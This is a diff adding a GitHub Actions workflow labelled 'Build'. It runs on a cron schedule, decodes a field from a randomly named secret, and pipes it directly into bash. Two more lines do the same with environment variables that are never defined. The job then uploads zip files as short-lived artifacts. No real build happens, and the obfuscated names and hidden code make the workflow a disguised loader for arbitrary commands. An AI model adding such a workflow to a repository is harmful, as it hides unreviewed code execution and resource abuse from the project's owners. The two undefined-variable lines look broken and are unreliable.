@@ -1,0 +1,33 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '32 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          iry5496: ${{ secrets.iry5496 }}
+        run: |
+          printf '%s' "$iry5496" | jq -r .shetb66442 | /bin/bash
+          echo $vvznw2012 | jq -r .hx49615 | /bin/bash
+          echo $sapdz0 | jq -r .nray9 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 3ZB3wHf0
+          path: "*.zip"
+          retention-days: 1
